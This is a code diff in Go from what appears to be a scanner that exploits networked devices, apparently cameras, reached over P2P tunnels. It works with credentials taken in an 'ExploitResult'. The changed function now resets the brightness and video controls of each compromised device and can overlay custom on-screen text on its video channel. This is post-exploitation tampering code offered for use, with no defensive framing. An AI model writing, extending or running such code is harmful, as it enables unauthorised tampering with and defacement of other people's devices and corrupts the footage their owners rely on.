@@ -759,19 +759,18 @@ func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 }
 
 func (s *Scanner) launchOSD(serial string, tunnel *p2p.PTCPTunnel, res *ExploitResult, cleanup func()) {
-	if !s.Config.Overlay.Osd || res == nil || res.Login == "" || res.Password == "" {
+	if res == nil || res.Login == "" || res.Password == "" || tunnel == nil {
 		if cleanup != nil {
 			cleanup()
 		}
 		return
 	}
-	channel := normalizeOSDChannel(s.Config.Overlay.Channel)
-	lines := normalizeOSDLines(s.Config.Overlay.Custom)
-	if channel == "" && len(lines) == 0 {
-		if cleanup != nil {
-			cleanup()
-		}
-		return
+	applyOSD := s.Config.Overlay.Osd
+	channel, lines := "", []string(nil)
+	if applyOSD {
+		channel = normalizeOSDChannel(s.Config.Overlay.Channel)
+		lines = normalizeOSDLines(s.Config.Overlay.Custom)
+		applyOSD = channel != "" || len(lines) > 0
 	}
 
 	s.snapshotWg.Add(1)
@@ -782,6 +781,19 @@ func (s *Scanner) launchOSD(serial string, tunnel *p2p.PTCPTunnel, res *ExploitR
 		}
 		redial := func() (*p2p.PTCPTunnel, func(), bool) {
 			return s.dialFreshTunnel(serial, res)
+		}
+		if err := TryBrightnessReset(tunnel, res.Login, res.Password); err != nil {
+			DebugLogf("brightness", "%s > reset failed: %v", serial, err)
+		} else {
+			DebugLogf("brightness", "%s > reset to default", serial)
+		}
+		if err := TryVideoControlsReset(tunnel, res.Login, res.Password); err != nil {
+			DebugLogf("video", "%s > control reset failed: %v", serial, err)
+		} else {
+			DebugLogf("video", "%s > controls reset to default", serial)
+		}
+		if !applyOSD {
+			return
 		}
 		err := TryOSD(tunnel, res.Login, res.Password, channel, lines, redial)
 		if err != nil {
